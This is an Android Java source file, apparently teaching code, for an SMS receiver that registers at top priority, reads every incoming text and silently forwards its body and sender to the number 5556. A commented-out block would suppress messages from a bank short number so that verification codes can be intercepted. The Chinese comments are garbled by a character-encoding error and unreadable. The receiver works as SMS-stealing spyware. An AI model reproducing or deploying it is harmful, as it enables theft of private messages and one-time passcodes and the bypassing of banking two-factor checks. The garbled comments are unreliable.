package com.itheima.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
/*���嵥�ļ�ע��
 * <receiver android:name="com.itheima.sms.SmsListener" >
            <intent-filter android:priority="1000" >
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
 * 
 * ���ҿ�ͨȨ��
 * android.permission.RECEIVE_SMS
 * android.permission.SEND_SMS
 * 
 */

public class SmsListener extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		//���嵥�ļ���ע��Ҫ���չ㲥������.
		//
		System.out.println("�յ��㲥��-����");
		//һ�����
		Object[] obj = (Object[]) intent.getExtras().get("pdus");
		for (Object ob : obj) {
			//�̶���ʽ����
			SmsMessage sms = SmsMessage.createFromPdu((byte[])ob);
			//��ȡ��Ϣ�ͺ���
			String body = sms.getMessageBody();
			String address = sms.getOriginatingAddress();
			System.out.println(body+"----"+address);
			//����Ϣת��
			SmsManager smsmanager = SmsManager.getDefault();
			smsmanager.sendTextMessage("5556", null, "������ϢΪ:"+body+"-"+address, null, null);
			//���ع����Ϣ
//			if(address.equals("95533")){
//				System.out.println("��ȡ��֤�룬͵͵�ĺ�̨֧��");
//				abortBroadcast();
//			}
		}
	}

}
